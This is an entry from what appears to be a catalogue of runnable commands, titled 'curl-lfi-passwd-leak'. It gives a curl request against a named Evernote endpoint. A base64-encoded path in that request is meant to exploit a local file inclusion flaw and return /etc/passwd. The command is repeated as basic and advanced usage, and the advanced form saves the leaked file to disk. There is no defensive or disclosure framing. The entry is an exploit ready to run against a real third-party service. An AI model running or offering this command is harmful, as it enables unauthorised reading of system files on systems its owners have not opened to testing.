---
data: >-
  curl
  "https://www.evernote.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js"
tags:
  - lfi
  - curl
  - passwd
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:29.996Z'
id: 06006c3d-f727-45b4-904e-42795324a55c
verified: false
validated: true
submitted: true
---
# curl-lfi-passwd-leak

## Command

```bash
curl "https://www.evernote.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js"
```

## Description

Requests the /etc/passwd file via LFI in the Evernote endpoint using base64 encoding, leaking user account information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Encoded endpoint for /etc/passwd | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.evernote.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js"
```

### Advanced Usage

```bash
curl -v "https://www.evernote.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js" > passwd.txt
```

## Expected Output

Contents of /etc/passwd, e.g., root:x:0:0:root:/root:/bin/bash.

## Related

- [[Related Procedure]]
